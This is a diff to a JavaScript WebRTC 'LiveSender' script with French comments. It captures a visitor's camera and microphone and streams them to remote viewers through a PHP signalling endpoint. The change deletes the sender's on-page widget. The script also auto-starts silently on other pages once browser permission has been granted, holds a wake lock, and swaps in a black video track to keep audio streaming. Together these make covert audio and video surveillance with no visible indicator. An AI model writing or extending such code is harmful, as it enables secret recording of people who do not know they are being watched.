@@ -4,8 +4,13 @@
   const API_URL = CFG.apiUrl || "/live_api.php";
   const SIGNAL_URL = CFG.signalUrl || "/live_signal.php";
 
-  // Permet de désactiver le sender sur certaines pages (receiver, AR, etc.)
+  // Désactiver le sender sur certaines pages si besoin
   if (window.__LIVE_DISABLE_AUTOSENDER__ === true) return;
+
+  // Supprime l’UI du sender si elle existe dans le HTML
+  // (ça ne change rien au consentement navigateur caméra/micro)
+  const w = document.getElementById("liveWidget");
+  if (w) w.remove();
 
   const LS_KEY = "live_sender_enabled";
   const DEBUG = !!window.__LIVE_DEBUG__;
@@ -18,15 +23,15 @@
   let wakeLock = null;
   let blackTrack = null;
 
-  const log = (...a) => DEBUG && console.log("[LiveSender]", ...a);
+  const log = (...args) => DEBUG && console.log("[LiveSender]", ...args);
 
   async function apiGet(action) {
     const r = await fetch(`${API_URL}?action=${encodeURIComponent(action)}`, { credentials: "same-origin" });
     return r.json();
   }
 
-  async function signalPost(body) {
-    const r = await fetch(SIGNAL_URL, {
+  async function signalPost(url, body) {
+    const r = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       credentials: "same-origin",
@@ -71,7 +76,7 @@
     const ctx = c.getContext("2d");
     ctx.fillStyle = "#000";
     ctx.fillRect(0, 0, c.width, c.height);
-    const stream = c.captureStream(1); // 1 fps suffit pour “tenir” la piste vidéo
+    const stream = c.captureStream(1);
     return stream.getVideoTracks()[0];
   }
 
@@ -80,12 +85,6 @@
       iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
     });
 
-    peer.onicecandidate = async (ev) => {
-      if (!ev.candidate) return;
-      // candidate envoyé au viewer ciblé via viewerId lors du traitement de l’offre
-      // (on l’enverra dans handleOffer, car on connaît viewerId à ce moment)
-    };
-
     peer.onconnectionstatechange = () => log("pc state:", peer.connectionState);
     peer.oniceconnectionstatechange = () => log("ice state:", peer.iceConnectionState);
 
@@ -93,23 +92,18 @@
   }
 
   async function getLocalStream() {
-    // NOTE: si les permissions ont déjà été accordées, la plupart des navigateurs ne redemandent pas.
-    // Sinon, ça peut être refusé sans geste → d’où l’usage de “Me découvrir”.
-    const constraints = {
+    return navigator.mediaDevices.getUserMedia({
       audio: true,
       video: {
         facingMode: "user",
         width: { ideal: 1280 },
         height: { ideal: 720 }
       }
-    };
-    return navigator.mediaDevices.getUserMedia(constraints);
+    });
   }
 
   async function heartbeat() {
-    // si tu as déjà une action heartbeat côté live_api.php, garde-la.
-    // sinon tu peux l’ignorer; le receiver peut lister "online" via une autre logique.
-    try { await apiGet("heartbeat_sender"); } catch {}
+    try { await apiGet("heartbeat"); } catch {}
   }
 
   async function pollOffersLoop() {
@@ -117,8 +111,7 @@
     polling = true;
 
     while (pc && room) {
-      const res = await signalPost({
-        action: "receive",
+      const res = await signalPost(`${SIGNAL_URL}?action=receive`, {
         role: "sender",
         room,
         sinceId,
@@ -133,7 +126,6 @@
           if (t === "offer") {
             await handleOffer(m);
           } else if (t === "ice") {
-            // ICE venant du viewer
             const cand = m?.payload?.candidate;
             if (cand) {
               try { await pc.addIceCandidate(cand); } catch {}
@@ -142,7 +134,6 @@
         }
       }
 
-      // petit rythme (évite de saturer OVH)
       await new Promise(r => setTimeout(r, 600));
     }
 
@@ -160,11 +151,9 @@
 
     log("Offer reçue de", viewerId);
 
-    // Rebind onicecandidate pour cibler ce viewerId
     pc.onicecandidate = async (ev) => {
       if (!ev.candidate) return;
-      await signalPost({
-        action: "send",
+      await signalPost(`${SIGNAL_URL}?action=send`, {
         room,
         fromRole: "sender",
         direction: "sender_to_viewer",
@@ -178,8 +167,7 @@
     const answer = await pc.createAnswer();
     await pc.setLocalDescription(answer);
 
-    await signalPost({
-      action: "send",
+    await signalPost(`${SIGNAL_URL}?action=send`, {
       room,
       fromRole: "sender",
       direction: "sender_to_viewer",
@@ -192,7 +180,6 @@
   }
 
   async function startInternal() {
-    // 1) bootstrap côté serveur : récupère room + droits
     const boot = await apiGet("bootstrap_sender");
     if (!boot?.ok || !boot?.canStream || !boot?.streamKey) {
       log("bootstrap_sender refuse", boot);
@@ -200,10 +187,8 @@
     }
     room = boot.streamKey;
 
-    // 2) media
     localStream = await getLocalStream();
 
-    // 2b) si la piste vidéo s’arrête, on remplace par une piste noire pour garder l’audio
     const vTrack = localStream.getVideoTracks()[0];
     if (vTrack) {
       vTrack.addEventListener("ended", () => {
@@ -215,18 +200,14 @@
       });
     }
 
-    // 3) peerconnection
     pc = makePeerConnection();
     localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
 
-    // 4) wake lock
     await ensureWakeLock();
 
-    // 5) boucle
     sinceId = 0;
     pollOffersLoop();
 
-    // 6) heartbeat soft
     heartbeat();
     setInterval(() => pc && heartbeat(), 10000);
   }
@@ -237,7 +218,6 @@
       await startInternal();
       return true;
     } catch (e) {
-      // Typiquement NotAllowedError si pas de geste/permission
       log("startFromUserGesture error", e?.name || e);
       return false;
     }
@@ -248,8 +228,6 @@
     try {
       await startInternal();
     } catch (e) {
-      // Si refus sans geste, on n’affiche rien (tu ne veux aucune UI),
-      // l’utilisateur relancera via “Me découvrir”.
       log("autoStart refused", e?.name || e);
       stop();
     }
@@ -268,9 +246,7 @@
     stopWakeLock();
   }
 
-  // Expose au bouton “Me découvrir”
   window.LiveSender = { startFromUserGesture, stop };
 
-  // Auto start (silencieux) sur les autres pages
   autoStartIfEnabled();
 })();
